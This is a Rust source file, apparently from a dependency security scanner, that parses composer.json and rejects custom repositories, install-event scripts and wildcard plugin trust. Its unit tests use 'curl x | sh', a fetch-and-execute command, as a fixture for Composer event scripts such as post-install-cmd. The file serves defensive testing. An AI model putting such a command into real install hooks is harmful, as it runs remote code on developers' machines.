use crate::Dependency;
use anyhow::{Context, Result};
use std::path::Path;

pub fn parse(project_dir: &Path) -> Result<Vec<Dependency>> {
    let path = project_dir.join("composer.json");
    let content = super::read_file_limited(&path, super::MAX_MANIFEST_BYTES)
        .context("Failed to read composer.json")?;
    let parsed: serde_json::Value =
        serde_json::from_str(&content).context("Failed to parse composer.json")?;
    validate_supported_sources(&parsed, &path)?;

    let mut deps = Vec::new();

    for section in ["require", "require-dev"] {
        if let Some(obj) = parsed.get(section).and_then(|v| v.as_object()) {
            for (name, version) in obj {
                if is_platform_package(name) {
                    continue;
                }
                let version = version.as_str().ok_or_else(|| {
                    anyhow::anyhow!(
                        "Unsupported Composer dependency '{}' in {}: only string version constraints are supported",
                        crate::report::sanitize_for_terminal(name),
                        path.display()
                    )
                })?;
                let dep = Dependency {
                    name: name.clone(),
                    version: Some(version.to_string()),
                    ecosystem: crate::Ecosystem::Php,
                    actual_name: None,
                };
                super::validate_dependency(&dep, &path)?;
                deps.push(dep);
            }
        }
    }

    Ok(deps)
}

/// Composer platform packages describe the runtime and are never downloaded
/// from Packagist. They never contain a vendor `/`, so a real package cannot
/// hide behind these names.
fn is_platform_package(name: &str) -> bool {
    !name.contains('/')
        && (matches!(
            name,
            "php"
                | "php-64bit"
                | "php-ipv6"
                | "php-zts"
                | "php-debug"
                | "hhvm"
                | "composer"
                | "composer-plugin-api"
                | "composer-runtime-api"
        ) || name.starts_with("ext-")
            || name.starts_with("lib-"))
}

fn validate_supported_sources(parsed: &serde_json::Value, path: &Path) -> Result<()> {
    let has_custom_repositories = parsed.get("repositories").is_some_and(|value| match value {
        serde_json::Value::Array(entries) => !entries.is_empty(),
        serde_json::Value::Object(entries) => !entries.is_empty(),
        _ => true,
    });

    if has_custom_repositories {
        anyhow::bail!(
            "Unsupported Composer repositories in {}: custom package sources are not supported",
            path.display()
        );
    }

    reject_install_time_code(parsed, path)
}

/// Whether a root script key names a Composer event rather than a custom `composer run` script.
/// Composer runs root scripts for every event it dispatches, including the command and
/// plugin events (`pre-command-run`, `post-file-download`, `pre-pool-create`, ...), so every
/// `pre-`/`post-` key and the bare `init`/`command` events count.
fn is_event_name(key: &str) -> bool {
    key.starts_with("pre-") || key.starts_with("post-") || matches!(key, "init" | "command")
}

/// Scripts bound to install events and blanket plugin trust execute code that no scan sees.
fn reject_install_time_code(parsed: &serde_json::Value, path: &Path) -> Result<()> {
    if let Some(scripts) = parsed.get("scripts").and_then(|value| value.as_object())
        && let Some(event) = scripts.keys().find(|key| {
            is_event_name(key)
                && scripts.get(*key).is_some_and(|value| match value {
                    serde_json::Value::Array(entries) => !entries.is_empty(),
                    serde_json::Value::String(text) => !text.is_empty(),
                    _ => true,
                })
        })
    {
        anyhow::bail!(
            "Unsupported Composer script in {}: '{}' runs unscanned code during install",
            path.display(),
            event
        );
    }
    let blanket = match parsed.pointer("/config/allow-plugins") {
        Some(serde_json::Value::Bool(allowed)) => *allowed,
        Some(serde_json::Value::Object(plugins)) => plugins
            .iter()
            .any(|(pattern, value)| pattern.contains('*') && value.as_bool() == Some(true)),
        _ => false,
    };
    if blanket {
        anyhow::bail!(
            "Unsupported Composer config in {}: allow-plugins permits every plugin to run unscanned code",
            path.display()
        );
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::parsers::test_utils::*;

    fn setup_dir(content: &str) -> std::path::PathBuf {
        setup_test_dir("composer", "composer.json", content)
    }

    #[test]
    fn parse_require_and_require_dev() {
        let dir = setup_dir(
            r#"{
            "require": {"laravel/framework": "^10.0", "guzzlehttp/guzzle": "^7.0"},
            "require-dev": {"phpunit/phpunit": "^10.0"}
        }"#,
        );
        let deps = parse(&dir).unwrap();
        assert_eq!(deps.len(), 3);
        let names: Vec<_> = deps.iter().map(|d| d.name.as_str()).collect();
        assert!(names.contains(&"laravel/framework"));
        assert!(names.contains(&"phpunit/phpunit"));
        assert_eq!(deps[0].ecosystem, crate::Ecosystem::Php);
        cleanup(&dir);
    }

    #[test]
    fn skip_php_and_ext_entries() {
        let dir = setup_dir(
            r#"{
            "require": {"php": "^8.1", "ext-json": "*", "laravel/framework": "^10.0"}
        }"#,
        );
        let deps = parse(&dir).unwrap();
        assert_eq!(deps.len(), 1);
        assert_eq!(deps[0].name, "laravel/framework");
        cleanup(&dir);
    }

    #[test]
    fn skip_all_composer_platform_packages() {
        let dir = setup_dir(
            r#"{
            "require": {
                "php-64bit": "^8.1",
                "composer-plugin-api": "^2.0",
                "composer-runtime-api": "^2.2",
                "composer": "^2.0",
                "lib-openssl": "*",
                "lib-icu": ">=60",
                "laravel/framework": "^10.0"
            }
        }"#,
        );
        let deps = parse(&dir).unwrap();
        let names: Vec<_> = deps.iter().map(|d| d.name.as_str()).collect();
        assert_eq!(names, vec!["laravel/framework"]);
        cleanup(&dir);
    }

    #[test]
    fn handle_missing_sections() {
        let dir = setup_dir(r#"{"name": "test/pkg", "description": "test"}"#);
        let deps = parse(&dir).unwrap();
        assert!(deps.is_empty());
        cleanup(&dir);
    }

    #[test]
    fn install_event_scripts_block_but_other_scripts_do_not() {
        let dir = setup_dir(
            r#"{"require": {"a/b": "^1.0"}, "scripts": {"post-install-cmd": ["curl x | sh"]}}"#,
        );
        let err = parse(&dir).unwrap_err().to_string();
        assert!(err.contains("post-install-cmd"), "{err}");
        cleanup(&dir);

        let dir = setup_dir(r#"{"require": {"a/b": "^1.0"}, "scripts": {"test": "phpunit"}}"#);
        assert!(parse(&dir).is_ok());
        cleanup(&dir);
    }

    #[test]
    fn plugin_and_command_events_block_like_install_events() {
        for event in [
            "pre-command-run",
            "post-file-download",
            "pre-pool-create",
            "init",
        ] {
            let dir = setup_dir(&format!(
                r#"{{"require": {{"a/b": "^1.0"}}, "scripts": {{"{event}": "curl x | sh"}}}}"#
            ));
            assert!(parse(&dir).is_err(), "{event}");
            cleanup(&dir);
        }
    }

    #[test]
    fn wildcard_allow_plugins_patterns_block() {
        let dir = setup_dir(
            r#"{"require": {"a/b": "^1.0"}, "config": {"allow-plugins": {"*/*": true}}}"#,
        );
        assert!(parse(&dir).is_err());
        cleanup(&dir);
    }

    #[test]
    fn blanket_allow_plugins_blocks_but_named_plugins_do_not() {
        for blanket in [r#"true"#, r#"{"*": true}"#] {
            let dir = setup_dir(&format!(
                r#"{{"require": {{"a/b": "^1.0"}}, "config": {{"allow-plugins": {blanket}}}}}"#
            ));
            assert!(parse(&dir).is_err(), "{blanket}");
            cleanup(&dir);
        }
        let dir = setup_dir(
            r#"{"require": {"a/b": "^1.0"}, "config": {"allow-plugins": {"a/b": true}}}"#,
        );
        assert!(parse(&dir).is_ok());
        cleanup(&dir);
    }
}
